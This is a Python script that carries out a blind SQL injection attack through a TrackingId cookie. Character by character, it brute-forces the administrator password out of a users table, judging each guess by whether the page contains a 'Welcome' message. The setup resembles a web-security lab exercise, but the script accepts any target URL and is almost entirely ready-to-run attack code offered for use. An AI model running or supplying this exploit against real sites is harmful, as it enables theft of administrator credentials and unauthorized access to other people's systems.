import sys
import requests
import urllib3
import urllib
from time import sleep

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure proxy if needed (set to None if not using Burp)

# proxies = None  # Uncomment to disable proxy

def sqli_password(url):
    password_extracted = ""
    
    # Update these with your actual cookies
    TRACKING_ID = " "  # Replace with your TrackingId
    SESSION_COOKIE = " "  # Replace with your session cookie
    
    print("\n[+] Starting password extraction...")
    
    for i in range(1, 21):  # Assuming 20 character password
        for j in range(32, 126):  # Printable ASCII range
            try:
                # Build the SQL injection payload
                sqli_payload = f"' AND (SELECT ASCII(SUBSTRING(password,{i},1)) FROM users WHERE username='administrator')='{j}'--"
                sqli_payload_encoded = urllib.parse.quote(sqli_payload)
                
                cookies = {
                    'TrackingId': TRACKING_ID + sqli_payload_encoded,
                    'session': SESSION_COOKIE
                }
                
                # Make the request
                r = requests.get(
                    url,
                    cookies=cookies,
                    verify=False,
                    timeout=10
                )
                
                # Debug output (uncomment if needed)
                # print(f"Testing position {i}, char {j} ({chr(j)}), Status: {r.status_code}")
                
                # Check if the condition was true
                if "Welcome" in r.text or "welcome" in r.text.lower():
                    password_extracted += chr(j)
                    print(f"\n[+] Found character {i}: {chr(j)}")
                    print(f"[+] Current progress: {password_extracted}\n")
                    break  # Move to next character position
                else:
                    # Show progress
                    sys.stdout.write('\r' + f"Testing position {i}: {password_extracted}{chr(j)}")
                    sys.stdout.flush()
                
                # Small delay to avoid overwhelming server
                sleep(0.1)
                
            except requests.exceptions.RequestException as e:
                print(f"\n[!] Error occurred: {str(e)}")
                print("[!] Retrying current character...")
                sleep(2)
                continue
            except KeyboardInterrupt:
                print("\n[!] User interrupted the process.")
                print(f"[*] Partial password recovered: {password_extracted}")
                sys.exit(1)
        
        else:
            # This executes if inner loop completes without finding a character
            print(f"\n[!] Failed to find character at position {i}")
            print(f"[*] Partial password: {password_extracted}")
            return
    
    print("\n[+] Password extraction complete!")
    print(f"[+] Administrator password: {password_extracted}")

def main():
    if len(sys.argv) != 2:
        print("[!] Error: Missing target URL")
        print(f"[+] Usage: {sys.argv[0]} <target_url>")
        print(f"[+] Example: {sys.argv[0]} https://vulnerable-site.com")
        sys.exit(1)
    
    url = sys.argv[1]
    print(f"[+] Target URL: {url}")
    print("[+] Starting SQL injection attack...")
    
    try:
        sqli_password(url)
    except Exception as e:
        print(f"\n[!] Critical error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
